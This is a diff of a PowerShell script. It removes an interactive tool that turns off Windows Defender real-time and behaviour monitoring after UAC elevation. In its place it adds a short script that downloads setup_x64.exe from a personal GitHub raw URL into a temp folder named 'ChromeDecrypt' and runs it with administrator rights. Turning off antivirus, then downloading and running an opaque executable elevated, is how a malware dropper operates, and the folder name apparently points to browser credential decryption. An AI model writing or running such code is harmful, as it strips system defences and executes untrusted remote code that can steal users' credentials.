@@ -1,161 +1,20 @@
-# Advanced Defender Control - Persistent Window
-# ===========================================
+# Simple Execution Script for setup_x64.exe
+# Downloads and runs with admin privileges
 
-# Function to check admin
-function Test-Admin {
-    return ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+# Create temp folder for download
+$tempFolder = "$env:TEMP\ChromeDecrypt"
+if (-not (Test-Path $tempFolder)) {
+    New-Item -ItemType Directory -Path $tempFolder -Force | Out-Null
 }
 
-# Function to run as admin with persistent window
-function Run-AsAdmin {
-    param([string]$Command)
-    
-    # Create a temporary script file
-    $tempScript = Join-Path $env:TEMP "defender_control_$(Get-Random).ps1"
-    
-    # Script content that keeps window open
-    $scriptContent = @'
-# Defender Control Script
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "  WINDOWS DEFENDER CONTROL (ADMIN MODE)" -ForegroundColor Cyan
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host ""
+# Download URL
+$url = 'https://github.com/bunny1233/mynewscripts/raw/refs/heads/main/setup_x64.exe'
+$outputFile = Join-Path $tempFolder 'setup_x64.exe'
 
-# Check current status
-try {
-    $status = Get-MpComputerStatus
-    Write-Host "Current Status:" -ForegroundColor Yellow
-    Write-Host "• Real-time protection: $($status.RealtimeProtectionEnabled)" -ForegroundColor White
-    Write-Host "• Last quick scan: $($status.QuickScanAge) days ago" -ForegroundColor White
-} catch {
-    Write-Host "Error checking status: $_" -ForegroundColor Red
-}
+# Download the file
+Write-Host "Downloading setup_x64.exe..." -ForegroundColor Yellow
+Invoke-WebRequest -Uri $url -OutFile $outputFile -UseBasicParsing
 
-Write-Host ""
-'@
-    
-    # Add the command to execute
-    $scriptContent += @"
-# Execute command
-Write-Host "Executing: $Command" -ForegroundColor Yellow
-try {
-    Invoke-Expression "$Command"
-    Write-Host "`n[SUCCESS] Command executed!" -ForegroundColor Green
-} catch {
-    Write-Host "`n[ERROR] Failed: $_" -ForegroundColor Red
-}
-"@
-    
-    # Add final part to keep window open
-    $scriptContent += @'
-
-Write-Host ""
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "Window will stay open for 30 seconds..."
-Write-Host "Press Ctrl+C to close immediately"
-Write-Host "========================================" -ForegroundColor Cyan
-
-# Keep window open
-$counter = 30
-while ($counter -gt 0) {
-    Write-Host "`rClosing in $counter seconds... " -NoNewline
-    Start-Sleep 1
-    $counter--
-}
-Write-Host "`nExiting..."
-'@
-    
-    # Write the script file
-    $scriptContent | Out-File -FilePath $tempScript -Encoding UTF8
-    
-    # Run the script as admin
-    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tempScript`"" -Verb RunAs -WindowStyle Normal
-}
-
-# Main execution
-Clear-Host
-
-# If already admin, run directly
-if (Test-Admin) {
-    Write-Host "========================================" -ForegroundColor Green
-    Write-Host "  Running in ADMINISTRATOR mode" -ForegroundColor Green
-    Write-Host "========================================" -ForegroundColor Green
-    Write-Host ""
-    
-    # Show current status
-    $currentStatus = Get-MpComputerStatus
-    Write-Host "Current Defender Status:" -ForegroundColor Yellow
-    Write-Host "• Real-time protection: $($currentStatus.RealtimeProtectionEnabled)" -ForegroundColor White
-    Write-Host ""
-    
-    # Ask what to do
-    Write-Host "What do you want to do?" -ForegroundColor Cyan
-    Write-Host "1. DISABLE Defender" -ForegroundColor White
-    Write-Host "2. ENABLE Defender" -ForegroundColor White
-    Write-Host "3. Exit" -ForegroundColor White
-    Write-Host ""
-    
-    $choice = Read-Host "Enter choice (1-3)"
-    
-    switch ($choice) {
-        '1' {
-            Write-Host "`nDisabling Windows Defender..." -ForegroundColor Yellow
-            Set-MpPreference -DisableRealtimeMonitoring $true
-            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
-            Write-Host "[SUCCESS] Defender DISABLED!" -ForegroundColor Green
-        }
-        '2' {
-            Write-Host "`nEnabling Windows Defender..." -ForegroundColor Yellow
-            Set-MpPreference -DisableRealtimeMonitoring $false
-            Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
-            Write-Host "[SUCCESS] Defender ENABLED!" -ForegroundColor Green
-        }
-        '3' { exit }
-        default { Write-Host "Invalid choice!" -ForegroundColor Red }
-    }
-    
-    # Show final status
-    Start-Sleep 2
-    $finalStatus = Get-MpComputerStatus
-    Write-Host "`nFinal Status:" -ForegroundColor Yellow
-    Write-Host "• Real-time protection: $($finalStatus.RealtimeProtectionEnabled)" -ForegroundColor White
-    
-    Write-Host "`nPress any key to exit..." -ForegroundColor Gray
-    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-    
-} else {
-    # Not admin - show menu and elevate
-    Write-Host "========================================" -ForegroundColor Yellow
-    Write-Host "  WINDOWS DEFENDER CONTROL" -ForegroundColor Yellow
-    Write-Host "========================================" -ForegroundColor Yellow
-    Write-Host ""
-    Write-Host "This tool requires administrator rights." -ForegroundColor White
-    Write-Host "You will be prompted for UAC elevation." -ForegroundColor White
-    Write-Host ""
-    Write-Host "Select action:" -ForegroundColor Cyan
-    Write-Host "1. DISABLE Windows Defender" -ForegroundColor White
-    Write-Host "2. ENABLE Windows Defender" -ForegroundColor White
-    Write-Host "3. Exit" -ForegroundColor White
-    Write-Host ""
-    
-    $choice = Read-Host "Enter choice (1-3)"
-    
-    switch ($choice) {
-        '1' {
-            Write-Host "`nElevating to disable Defender..." -ForegroundColor Yellow
-            Run-AsAdmin -Command "Set-MpPreference -DisableRealtimeMonitoring `$true; Set-MpPreference -DisableBehaviorMonitoring `$true"
-            Write-Host "Admin window launched. Check the new window for results." -ForegroundColor Cyan
-        }
-        '2' {
-            Write-Host "`nElevating to enable Defender..." -ForegroundColor Yellow
-            Run-AsAdmin -Command "Set-MpPreference -DisableRealtimeMonitoring `$false; Set-MpPreference -DisableBehaviorMonitoring `$false"
-            Write-Host "Admin window launched. Check the new window for results." -ForegroundColor Cyan
-        }
-        '3' { exit }
-        default { Write-Host "Invalid choice!" -ForegroundColor Red }
-    }
-    
-    # Keep this window open
-    Write-Host "`nThis window will close in 5 seconds..." -ForegroundColor Gray
-    Start-Sleep 5
-}
+# Execute with admin privileges
+Write-Host "Running with admin privileges..." -ForegroundColor Yellow
+Start-Process -FilePath $outputFile -ArgumentList "-k all" -Verb RunAs
